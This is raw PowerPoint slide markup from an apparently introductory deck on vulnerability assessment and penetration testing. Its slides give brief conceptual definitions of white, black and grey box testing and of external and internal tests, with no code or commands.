                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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800100" marR="0" lvl="1" indent="-342900" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Create guidance to assist developers with remediating the identified vulnerabilities.</a:t>
            </a:r>
            <a:endParaRPr sz="15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2523825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0F624EB-4A25-BE6F-BA00-8805C464F1B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;130;p18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECAF19D5-C725-A3B0-18A5-E11D8173AE45}"/>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Vulnerability Assessment Approach</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Google Shape;132;p18" descr="steps to perform a vulnerability assessment">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F694D28-F377-9DD5-630F-09817194EF43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="757083" y="2349910"/>
            <a:ext cx="7502013" cy="3864077"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1577961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8;p19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C063961-9483-76E1-7C34-65C460ED9594}"/>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Penetration Testing</a:t>
            </a:r>
            <a:endParaRPr sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>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5" name="Google Shape;139;p19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E3982BD-742A-312E-E590-0A3714C1AD75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2249488"/>
            <a:ext cx="7886700" cy="409575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500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="20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225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Penetration testing (or pen testing) is a security exercise where a cyber-security expert attempts to find and exploit vulnerabilities in a computer system. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="225425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="20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25425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>The purpose of this simulated attack is to identify any weak spots in a system’s defenses which attackers could take advantage of.</a:t>
            </a:r>
            <a:endParaRPr sz="20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25425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="20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20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25425" marR="0" lvl="1" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri" panose="020F0502020204030204"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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214966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0488ECB-2CB5-BC12-AAB7-A41F72D4B1D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>On the basis of the amount of information shared prior to an engagement phase:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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White Box Pen Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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Black Box Pen Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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Grey Box Pen Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>On the bases of Network Assets to be tested; approach:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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External Pen Test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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Internal Pen Test </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Google Shape;145;p20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD2060AB-689F-4382-1F2F-05AD77E0DCD6}"/>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Penetration Testing: Types</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1533860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D52E25B-39C3-2180-D163-F6BCDDD7BB71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="225425" lvl="1" indent="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>White Box Pen Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="225425" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="225425" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>White box penetration testing, sometimes referred to as crystal or oblique box pen testing, involves sharing full network and system information with the tester, including network maps and credentials. This helps to save time and reduce the overall cost of an engagement. A white box penetration test is useful for simulating a targeted attack on a specific system utilizing as many attack vectors as possible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;152;p21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D47D34EA-E40F-DBB6-4543-F5FF0902B124}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd..</a:t>
            </a:r>
            <a:endParaRPr sz="24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157672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DA93071-DD00-DF3D-A00C-772684C4C99D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Black Box Pen Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>In a black box penetration test, no information is provided to the tester at all. The pen tester in this instance follows the approach of an unprivileged attacker, from initial access and execution through to exploitation. This scenario can be seen as the most authentic, demonstrating how an adversary with no inside knowledge would target and compromise an organization. However, this typically makes it the costliest option too.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="568325" lvl="1" indent="-247650" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;167;p23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1020238C-F644-83AA-B257-B8C5E847ADF0}"/>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Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4206152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B71B675-F78C-6BAB-B2D6-153E68F1D645}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;174;p24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BDF52ED-8A6C-DC9C-20E0-FEF8986D060D}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Google Shape;176;p24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{497A2928-6524-DF93-4D49-B95CE1472BA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2249993"/>
            <a:ext cx="7886699" cy="4013156"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2786842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DD2D264-B888-2D51-7ABE-F0E5C8E46D81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Grey Box Pen Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>In a grey box penetration test, also known as a translucent box test, only limited information is shared with the tester. Usually this takes the form of login credentials. Grey box testing is useful to help understand the level of access a privileged user could gain and the potential damage they could cause. Grey box tests strike a balance between depth and efficiency and can be used to simulate either an insider threat or an attack that has breached the network perimeter.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;182;p25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B5C4162-25D8-1834-7C68-67548A16FE4C}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd..</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2014059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B6F2F85-DED2-22DF-7116-B611E7676E36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;189;p26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F43467B-69AE-7CD9-98DE-4AF712E434A1}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Google Shape;191;p26" descr="grey box penetration testing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C8421E3-8716-64EC-39C4-71812AED4CE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect l="22443" t="5715" r="22839" b="6135"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="628649" y="2458064"/>
            <a:ext cx="7718937" cy="3559277"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3774228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1F36E74-F76A-AF45-B4B5-42545CC66AF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>External pen test </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>In an external test, the ethical hacker goes up against the company’s external-facing technology, such as their website and external network servers. In some cases, the hacker may not even be allowed to enter the company’s building. This can mean conducting the attack from a remote location or carrying out the test from a truck or van parked nearby.</a:t>
            </a:r>
          </a:p>
          <a:p>
